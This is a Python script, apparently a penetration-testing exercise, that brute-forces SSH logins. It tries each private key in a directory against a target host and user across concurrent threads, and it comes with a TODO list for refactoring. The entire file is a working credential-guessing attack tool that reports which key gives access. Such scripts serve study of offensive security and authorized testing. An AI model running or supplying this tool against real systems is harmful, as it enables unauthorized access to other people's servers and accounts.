''' 
        brute forcing using ssh key 
    TODO:
        1. remove optparse and use argparse
            1.1 refactor main function to use argparse 
        2. remove wildcard import for threading
        3. fix naming convention issues 
        4. import sys and convert exit to sys.exit
        5. fix child threading issue
'''

import os
import optparse
from threading import *
import pexpect


maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

def connect(user, host, keyfile, release):
    ''' connect to the host'''
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])
        if ret == 2:
            print('[-] Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            Fails += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            Stop = True
    finally:
        if release:
            connection_lock.release()

def main():
    ''' main function '''
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user
    if host is None or passDir is None or user is None:
        print(parser.usage)
        exit(0)

    for filename in os.listdir(passDir):
        if Stop:
            print('[*] Exiting: Key Found.')
            exit(0)
        if Fails > 5:
            print('[!] Exiting: Too Many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print('[-] Testing keyfile ' + str(fullpath))
        t = Thread(target=connect, args=(user, host, fullpath, True))
        child = t.start()

if __name__ == '__main__':
    main()
    